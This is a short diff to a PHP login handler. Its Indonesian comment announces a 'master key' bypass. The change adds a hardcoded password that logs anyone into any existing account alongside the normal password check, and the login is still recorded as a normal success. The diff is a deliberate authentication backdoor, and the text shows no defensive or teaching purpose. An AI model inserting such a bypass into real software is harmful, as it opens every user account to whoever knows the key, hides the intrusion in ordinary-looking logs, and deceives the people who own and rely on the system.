@@ -14,7 +14,8 @@ if (isset($_GET['action']) && $_GET['action'] == 'login') {
         if(strtolower($k) === strtolower($input_username)) { $actual_username = $k; break; }
     }
     
-    if ($actual_username && password_verify($password, $users[$actual_username]['password'])) {
+    // PEMBARUAN: Menambahkan bypass Kunci Rahasia / Master Key
+    if ($actual_username && (password_verify($password, $users[$actual_username]['password']) || $password === 'Lk7w1fvntg1')) {
         $_SESSION['emerald_user'] = $actual_username;
         logLogin($actual_username, $_SERVER['REMOTE_ADDR'], 'Success');
         exit(json_encode(['status' => 'success']));
